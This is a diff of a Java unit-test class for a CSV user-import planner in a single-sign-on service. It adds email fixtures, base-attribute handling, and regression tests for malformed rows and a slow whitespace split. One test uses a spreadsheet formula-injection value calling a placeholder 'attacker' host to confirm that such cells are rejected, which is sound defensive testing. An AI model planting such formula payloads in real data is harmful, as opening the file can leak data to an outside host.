@@ -13,15 +13,19 @@ import com.example.sso.shared.error.BadRequestException;
 import com.example.sso.user.account.BaseUserFields;
 import java.util.Collections;
 import java.util.List;
+import java.util.Map;
 import java.util.UUID;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.ExtendWith;
+import org.mockito.ArgumentCaptor;
 import org.mockito.Mock;
 import org.mockito.junit.jupiter.MockitoExtension;
 
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
+import org.assertj.core.api.InstanceOfAssertFactories;
+
 import static org.assertj.core.api.InstanceOfAssertFactories.type;
 import static org.mockito.ArgumentMatchers.any;
 import static org.mockito.ArgumentMatchers.eq;
@@ -56,7 +60,7 @@ class CsvImportPlannerTest {
     @BeforeEach
     void setUp() {
         planner = new CsvImportPlanner(definitions, values, existingUsers, groups, 100, 20, 255);
-        declares(required(BaseUserFields.USERNAME), optional("team"));
+        declares(base(BaseUserFields.USERNAME), base(BaseUserFields.EMAIL), optional("team"));
         lenient().when(existingUsers.present(any())).thenReturn(List.of());
         lenient().when(groups.missing(any())).thenReturn(List.of());
     }
@@ -73,6 +77,16 @@ class CsvImportPlannerTest {
 
     private AttributeDefinition optional(String key) {
         return column(key, false, AttributeDataType.STRING, List.of());
+    }
+
+    /**
+     * What {@code definitionsIn} really returns for username/email/displayName: a SYNTHESISED definition with
+     * base=true. Every fixture here used base=false, so the suite's username was a stored attribute while
+     * production's is a base one — and the validator refuses base keys outright.
+     */
+    private AttributeDefinition base(String key) {
+        return new AttributeDefinition(UUID.randomUUID(), EntityKind.USER, key, key, null,
+                AttributeDataType.STRING, List.of(), false, false, AttributeSource.LOCAL, 0, true);
     }
 
     private void declares(AttributeDefinition... columns) {
@@ -94,7 +108,7 @@ class CsvImportPlannerTest {
 
     @Test
     void everyValidRowBecomesAPlannedUser() {
-        CsvImportPreview preview = plan("username,team\nada,platform\ngrace,compilers\n");
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io,platform\ngrace,g@x.io,compilers\n");
 
         assertThat(preview.rowsRead()).isEqualTo(2);
         assertThat(preview.toCreate()).extracting("username").containsExactly("ada", "grace");
@@ -105,7 +119,7 @@ class CsvImportPlannerTest {
     /** The whole point of a preview: it is a read. If it writes, confirming it is theatre. */
     @Test
     void planningOnlyReads() {
-        plan("username,team\nada,platform\n");
+        plan("username,email,team\nada,a@x.io,platform\n");
 
         verify(existingUsers).present(any());
         verify(groups).missing(any());
@@ -115,7 +129,7 @@ class CsvImportPlannerTest {
     /** The template ships a guidance row for the person filling it in; the importer must drop it, not import it. */
     @Test
     void theTemplatesGuidanceRowIsNotAUser() {
-        CsvImportPreview preview = plan("username,team\n# required string,optional string\nada,platform\n");
+        CsvImportPreview preview = plan("username,email,team\n# required string,string,optional string\nada,a@x.io,platform\n");
 
         assertThat(preview.rowsRead()).isEqualTo(1);
         assertThat(preview.toCreate()).extracting("username").containsExactly("ada");
@@ -123,7 +137,7 @@ class CsvImportPlannerTest {
 
     @Test
     void aBlankLineIsNotARow() {
-        CsvImportPreview preview = plan("username,team\nada,platform\n\n");
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io,platform\n\n");
 
         assertThat(preview.rowsRead()).isEqualTo(1);
         assertThat(preview.failures()).isEmpty();
@@ -135,7 +149,7 @@ class CsvImportPlannerTest {
     void anAccountThatAlreadyExistsIsReportedRatherThanCreatedAgain() {
         when(existingUsers.present(List.of("ada", "grace"))).thenReturn(List.of("ada"));
 
-        CsvImportPreview preview = plan("username,team\nada,platform\ngrace,compilers\n");
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io,platform\ngrace,g@x.io,compilers\n");
 
         assertThat(preview.existing()).containsExactly("ada");
         assertThat(preview.toCreate()).extracting("username").containsExactly("grace");
@@ -161,9 +175,9 @@ class CsvImportPlannerTest {
 
     @Test
     void moreRowsThanWeAcceptRefusesTheFile() {
-        StringBuilder csv = new StringBuilder("username,team\n");
+        StringBuilder csv = new StringBuilder("username,email,team\n");
         for (int i = 0; i <= 100; i++) {
-            csv.append("user").append(i).append(",platform\n");
+            csv.append("user").append(i).append(",u").append(i).append("@x.io,platform\n");
         }
 
         refusesFile(csv.toString(), "metadata.csv.tooManyRows");
@@ -180,7 +194,7 @@ class CsvImportPlannerTest {
 
     @Test
     void aRowMissingARequiredValueFailsOnItsOwn() {
-        CsvImportPreview preview = plan("username,team\n,platform\ngrace,compilers\n");
+        CsvImportPreview preview = plan("username,email,team\n,a@x.io,platform\ngrace,g@x.io,compilers\n");
 
         assertThat(preview.toCreate()).extracting("username").containsExactly("grace");
         assertThat(preview.failures()).singleElement()
@@ -191,7 +205,7 @@ class CsvImportPlannerTest {
     /** The line number is what an administrator uses to find the row, so it counts lines, not records. */
     @Test
     void aFailureNamesTheLineTheAdministratorWillLookFor() {
-        CsvImportPreview preview = plan("username,team\nada,platform\n,broken\n");
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io,platform\n,b@x.io,broken\n");
 
         assertThat(preview.failures()).singleElement().extracting(CsvRowFailure::line).isEqualTo(3L);
     }
@@ -206,7 +220,7 @@ class CsvImportPlannerTest {
         doThrow(BadRequestException.of("metadata.attribute.enumValue", "region"))
                 .when(values).validate(eq(PROFILE), any());
 
-        CsvImportPreview preview = plan("username,team\nada,antarctica\n");
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io,antarctica\n");
 
         assertThat(preview.failures()).singleElement()
                 .extracting(CsvRowFailure::reason).isEqualTo("metadata.attribute.enumValue");
@@ -214,7 +228,7 @@ class CsvImportPlannerTest {
 
     @Test
     void theSameUsernameTwiceInOneFileFailsTheSecond() {
-        CsvImportPreview preview = plan("username,team\nada,platform\nada,compilers\n");
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io,platform\nada,b@x.io,compilers\n");
 
         assertThat(preview.toCreate()).hasSize(1);
         assertThat(preview.failures()).singleElement()
@@ -223,7 +237,7 @@ class CsvImportPlannerTest {
 
     @Test
     void aCellLongerThanTheColumnHoldsFails() {
-        CsvImportPreview preview = plan("username,team\nada," + "x".repeat(256) + "\n");
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io," + "x".repeat(256) + "\n");
 
         assertThat(preview.failures()).singleElement()
                 .extracting(CsvRowFailure::reason).isEqualTo("metadata.csv.row.valueTooLong");
@@ -236,7 +250,7 @@ class CsvImportPlannerTest {
      */
     @Test
     void aCellThatOpensLikeAFormulaFails() {
-        CsvImportPreview preview = plan("username,team\nada,=WEBSERVICE(\"http://attacker\")\n");
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io,=WEBSERVICE(\"http://attacker\")\n");
 
         assertThat(preview.failures()).singleElement()
                 .extracting(CsvRowFailure::reason).isEqualTo("metadata.csv.row.formulaValue");
@@ -246,7 +260,7 @@ class CsvImportPlannerTest {
 
     @Test
     void theGroupsColumnIsOptionalAndSplitsOnSemicolons() {
-        CsvImportPreview preview = plan("username,groups\nada,platform;oncall\n");
+        CsvImportPreview preview = plan("username,email,groups\nada,a@x.io,platform;oncall\n");
 
         assertThat(preview.toCreate()).singleElement()
                 .extracting("groups").isEqualTo(List.of("platform", "oncall"));
@@ -260,11 +274,111 @@ class CsvImportPlannerTest {
     void aGroupThatDoesNotExistFailsTheRowRatherThanCreatingIt() {
         when(groups.missing(any())).thenReturn(List.of("platfrom"));
 
-        CsvImportPreview preview = plan("username,groups\nada,platfrom\n");
+        CsvImportPreview preview = plan("username,email,groups\nada,a@x.io,platfrom\n");
 
         assertThat(preview.toCreate()).isEmpty();
         assertThat(preview.failures()).singleElement()
                 .extracting(CsvRowFailure::reason, CsvRowFailure::detail)
                 .containsExactly("metadata.csv.row.unknownGroup", "platfrom");
+    }
+    /**
+     * The regression that made every real import fail: definitionsIn synthesises username/email as BASE
+     * attributes, ProfileAttributeValidator refuses any base key handed to it, and the planner was handing it
+     * all of them — so every row of every genuine file came back "metadata.attribute.undeclared / username".
+     * The suite could not see it because every fixture declared username as a stored attribute.
+     */
+    @Test
+    void baseAttributesAreNotOfferedToTheValidator() {
+        declares(base(BaseUserFields.USERNAME), base(BaseUserFields.EMAIL), optional("team"));
+
+        CsvImportPreview preview = plan("username,email,team\nada,ada@example.com,platform\n");
+
+        ArgumentCaptor<Map<String, List<String>>> validated = ArgumentCaptor.forClass(Map.class);
+        verify(values).validate(eq(PROFILE), validated.capture());
+        assertThat(validated.getValue()).containsOnlyKeys("team");
+        assertThat(preview.failures()).isEmpty();
+    }
+
+    /** The base values still have to reach the row — they are what the account is made from. */
+    @Test
+    void baseAttributesStillTravelWithTheRow() {
+        declares(base(BaseUserFields.USERNAME), base(BaseUserFields.EMAIL));
+
+        CsvImportPreview preview = plan("username,email\nada,ada@example.com\n");
+
+        assertThat(preview.toCreate()).singleElement()
+                .extracting("base", InstanceOfAssertFactories.MAP)
+                .containsEntry(BaseUserFields.EMAIL, "ada@example.com");
+    }
+    // --- shapes the parser can produce that the code has to survive ---------------------------------
+
+    /**
+     * A short row used to throw IllegalArgumentException — not an ApiException, so it escaped the row handler,
+     * escaped the planner and escaped apply's catch: one trailing-comma-short line turned a five-thousand-row
+     * import into a 500 that named no row at all.
+     */
+    @Test
+    void aRowWithFewerCellsThanTheHeaderFailsAlone() {
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io\ngrace,g@x.io,compilers\n");
+
+        assertThat(preview.toCreate()).extracting("username").containsExactly("ada", "grace");
+        assertThat(preview.failures()).isEmpty();
+    }
+
+    /** A repeated column means the file was built against a schema it does not match; last-wins hides data. */
+    @Test
+    void aRepeatedColumnRefusesTheFile() {
+        refusesFile("username,team,team\nada,a,b\n", "metadata.csv.duplicateColumn");
+    }
+
+    /** Blank lines are skipped, so record numbers stop tracking the file the administrator has open. */
+    @Test
+    void aLineNumberSurvivesABlankLineInTheMiddle() {
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io,platform\n\n,b@x.io,broken\n");
+
+        assertThat(preview.failures()).singleElement().extracting(CsvRowFailure::line).isEqualTo(4L);
+    }
+
+    @Test
+    void emptyGroupSegmentsAreIgnoredRatherThanNamingAGroupCalledNothing() {
+        CsvImportPreview preview = plan("username,email,groups\nada,a@x.io,platform;;oncall;\n");
+
+        assertThat(preview.toCreate()).singleElement()
+                .extracting("groups").isEqualTo(List.of("platform", "oncall"));
+    }
+
+    /**
+     * The quadratic split: a run of interior whitespace made this O(n²), and the cell-length ceiling could not
+     * help because it was applied after the split had already run. A cell well under the file cap measured out
+     * to about ninety minutes of CPU on one request thread.
+     */
+    @Test
+    void aLongWhitespaceRunInTheGroupsCellDoesNotHangTheRequest() {
+        String hostile = "x" + " ".repeat(200_000) + "y";
+
+        assertThat(java.util.concurrent.CompletableFuture
+                .supplyAsync(() -> plan("username,email,groups\nada,a@x.io,\"" + hostile + "\"\n"))
+                .orTimeout(10, java.util.concurrent.TimeUnit.SECONDS))
+                .succeedsWithin(java.time.Duration.ofSeconds(10));
+    }
+
+    // --- the accepted side of every ceiling ---------------------------------------------------------
+
+    @Test
+    void aCellExactlyAtTheLimitIsAccepted() {
+        CsvImportPreview preview = plan("username,email,team\nada,a@x.io," + "x".repeat(255) + "\n");
+
+        assertThat(preview.failures()).isEmpty();
+        assertThat(preview.toCreate()).hasSize(1);
+    }
+
+    @Test
+    void exactlyTheMaximumNumberOfRowsIsAccepted() {
+        StringBuilder csv = new StringBuilder("username,email,team\n");
+        for (int i = 0; i < 100; i++) {
+            csv.append("user").append(i).append(",u").append(i).append("@x.io,platform\n");
+        }
+
+        assertThat(plan(csv.toString()).rowsRead()).isEqualTo(100);
     }
 }
